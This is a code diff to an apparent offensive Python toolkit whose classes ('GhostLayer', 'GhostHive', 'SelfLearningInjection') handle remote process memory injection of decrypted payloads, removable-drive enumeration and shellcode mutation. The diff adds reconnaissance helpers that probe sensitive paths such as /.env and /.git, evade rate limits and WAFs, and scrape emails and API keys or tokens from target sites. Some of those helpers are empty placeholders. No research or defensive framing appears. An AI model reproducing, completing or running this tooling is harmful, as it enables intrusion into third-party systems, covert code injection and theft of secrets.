@@ -9,12 +9,13 @@ import shutil
 import mmap
 import platform
 import json
-from typing import Optional, List
+from typing import Optional, List, Any
 import ctypes
 import ctypes.wintypes as wintypes
 import requests
-from urllib.parse import urljoin
-from bs4 import BeautifulSoup
+from urllib.parse import urljoin, urlparse
+from bs4 import BeautifulSoup, Tag
+import re
 
 # Setup logging
 logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message)s')
@@ -22,7 +23,7 @@ logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(name)s] %(message
 class GhostLayer:
     """Manages payload operations with secure storage via BlackVault and recon data."""
     
-    def __init__(self, vault, logger: logging.Logger = None):
+    def __init__(self, vault: Any, logger: Optional[logging.Logger] = None):
         """
         Initializes GhostLayer with BlackVault and optional recon integration.
         
@@ -197,7 +198,7 @@ class GhostLayer:
                 if not addr:
                     kernel32.CloseHandle(h_process)
                     raise RuntimeError("Remote memory allocation failed")
-                written = wintypes.SIZE_T(0)
+                written = ctypes.c_size_t(0)
                 if not kernel32.WriteProcessMemory(h_process, addr, decrypted, 
                                                  len(decrypted), ctypes.byref(written)):
                     kernel32.CloseHandle(h_process)
@@ -270,9 +271,21 @@ class GhostLayer:
         usb_paths = []
         if platform.system() == "Windows":
             try:
-                import win32api
-                drives = win32api.GetLogicalDriveStrings().split('\0')[:-1]
-                usb_paths = [d for d in drives if win32api.GetDriveType(d) == 2]  # DRIVE_REMOVABLE
+                try:
+                    import win32file
+                    import win32api
+                except ImportError:
+                    self.logger.warning("pywin32 not installed, skipping USB detection on Windows")
+                    win32file = None
+                    win32api = None
+                if win32api and win32file:
+                    drives = win32api.GetLogicalDriveStrings().split('\0')[:-1]
+                    def get_drive_type(d):
+                        try:
+                            return win32file.GetDriveType(d)
+                        except Exception:
+                            return -1
+                    usb_paths = [d for d in drives if get_drive_type(d) == win32file.DRIVE_REMOVABLE]
             except ImportError:
                 self.logger.warning("win32api not available, skipping USB detection on Windows")
         elif platform.system() == "Linux":
@@ -328,7 +341,7 @@ class GhostLayer:
 class GhostLayerDaemon:
     """Runs continuous GhostLayer operations with recon-driven targets."""
     
-    def __init__(self, ghost_layer: 'GhostLayer', vault: 'BlackVault'):
+    def __init__(self, ghost_layer: 'GhostLayer', vault: Any):
         """
         Initializes the daemon with a GhostLayer and BlackVault instance.
         
@@ -381,7 +394,7 @@ class GhostLayerDaemon:
 class SelfLearningInjection:
     """Applies heuristic-based mutations to shellcode."""
     
-    def __init__(self, vault: 'BlackVault'):
+    def __init__(self, vault: Any):
         """
         Initializes with heuristics and a BlackVault instance.
         
@@ -473,7 +486,7 @@ class SelfLearningInjection:
 class GhostHive:
     """Manages multiple GhostLayer instances with recon-driven operations."""
     
-    def __init__(self, agents: List['GhostLayer'], vault: 'BlackVault'):
+    def __init__(self, agents: List['GhostLayer'], vault: Any):
         """
         Initializes with a list of GhostLayer agents and a BlackVault instance.
         
@@ -582,13 +595,19 @@ def advanced_recon(target: str, max_depth: int = 3, scope_domains: Optional[List
             if r.status_code in (403, 503) or elapsed > 10:
                 logger.warning(f"WAF anomaly: {url} status={r.status_code} delay={elapsed:.1f}s")
                 backoff = random.uniform(2, 10)
-            if r.headers.get('Retry-After'):
-                backoff = max(backoff, float(r.headers.get('Retry-After')))
-                logger.info(f"Rate limit detected. Backing off for {backoff:.1f}s")
-            elif r.headers.get('X-RateLimit-Reset'):
-                reset_time = float(r.headers.get('X-RateLimit-Reset'))
+            retry_after = r.headers.get('Retry-After', '0')
+            try:
+                backoff = max(backoff, float(retry_after))
+            except Exception:
+                pass
+            logger.info(f"Rate limit detected. Backing off for {backoff:.1f}s") if retry_after != '0' else None
+            xrlr = r.headers.get('X-RateLimit-Reset', '0')
+            try:
+                reset_time = float(xrlr)
                 backoff = max(backoff, max(0, reset_time - time.time()))
-                logger.info(f"Rate limit detected. Backing off for {backoff:.1f}s")
+                logger.info(f"Rate limit detected. Backing off for {backoff:.1f}s") if xrlr != '0' else None
+            except Exception:
+                pass
             if backoff > 0:
                 time.sleep(backoff + random.uniform(0.5, 2.5))
             
@@ -653,17 +672,66 @@ def advanced_recon(target: str, max_depth: int = 3, scope_domains: Optional[List
     logger.info(f"Recon complete: {len(endpoints)} endpoints, {len(forms)} forms, {len(js_endpoints)} JS endpoints")
     return report
 
- 
-    def load_recon_data(self, target: str, max_depth: int = 3, brute_subdomains: bool = True) -> dict:
-        try:
-            command_id = get_random_bytes(16).hex()
-            report = self.kernel.recon_module.advanced_recon(target, max_depth, None, brute_subdomains, command_id)
-            self.vault.store(f"recon_{target}_{command_id}", json.dumps(report).encode())
-            self.recon_data = report
-            self.logger.info(f"Loaded recon data for {target}: {len(report['endpoints'])} endpoints")
-            return report
-    except Exception as e:
-            self.logger.error(f"Failed to load recon data for {target}: {e}")
-            self.vault.store(f"recon_error_{time.time()}", 
-                        json.dumps({"target": target, "error": str(e)}).encode())
-            raise ValueError(f"Recon load failed: {e}")
+# --- Helper stubs and constants for recon ---
+COMMON_PATHS = [
+    '/', '/robots.txt', '/sitemap.xml', '/admin', '/login', '/dashboard', '/api', '/.git', '/.env', '/config', '/wp-admin', '/wp-login.php'
+]
+
+def get_subdomains(domain):
+    # Placeholder: should return set of subdomains
+    return set()
+
+def fetch_crtsh_subdomains(domain):
+    # Placeholder: should return set of subdomains from crt.sh
+    return set()
+
+def fetch_certspotter_subdomains(domain):
+    # Placeholder: should return set of subdomains from certspotter
+    return set()
+
+def dnstwist_permutations(domain):
+    # Placeholder: should return set of dnstwist permutations
+    return set()
+
+def brute_force_paths(target):
+    # Placeholder: should return list of brute-forced paths
+    return []
+
+def random_query_pad(url):
+    # Appends a random query param to bypass caches
+    return url + ("&" if "?" in url else "?") + f"r={random.randint(1000,9999)}"
+
+def get_random_headers():
+    # Returns random headers for requests
+    return {"User-Agent": f"ReconBot/{random.randint(1,10)}"}
+
+def extract_emails(html):
+    # Extract emails from HTML
+    return set(re.findall(r"[\w\.-]+@[\w\.-]+", html))
+
+def extract_secrets(html):
+    # Extract secrets (very basic)
+    return set(re.findall(r"(?i)(api[_-]?key|secret|token)['\"]?\s*[:=]\s*['\"]?([a-z0-9\-_]{16,})", html))
+
+def fingerprint_tech(headers, html):
+    # Dummy tech fingerprinting
+    tech = set()
+    if 'x-powered-by' in headers:
+        tech.add(headers['x-powered-by'])
+    if 'wp-content' in html:
+        tech.add('WordPress')
+    return tech
+
+def parse_robots(html, base_url):
+    # Parse robots.txt for Disallow/Allow paths
+    paths = []
+    for line in html.splitlines():
+        if line.lower().startswith('disallow:') or line.lower().startswith('allow:'):
+            path = line.split(':',1)[1].strip()
+            if path:
+                paths.append(urljoin(base_url, path))
+    return paths
+
+def parse_sitemap(html):
+    # Parse sitemap.xml for <loc> entries
+    return re.findall(r'<loc>(.*?)</loc>', html)
